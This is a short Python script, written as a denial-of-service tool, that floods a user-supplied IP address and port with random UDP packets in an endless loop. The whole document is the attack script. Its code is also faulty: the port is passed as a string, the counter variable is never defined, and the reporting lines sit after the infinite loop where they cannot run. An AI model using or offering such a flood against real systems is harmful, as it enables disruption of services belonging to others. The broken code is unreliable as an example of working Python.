import socket 
import random
# this works off a simple premise of attacking till you end. Just floods the heck out of a server
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #create the socket
bytes=random._urandom(1024) #create the packet
ip=input('Target IP: ') #insert IP to attack
port=input('Port: ') #port to attack

while 1: #loops sending packets to the port until you end program
    sock.sendto(bytes,(ip,port))
print ("Sent %s amount of packets to %s at port %s.") % (sent,ip,port)
sent= sent + 1
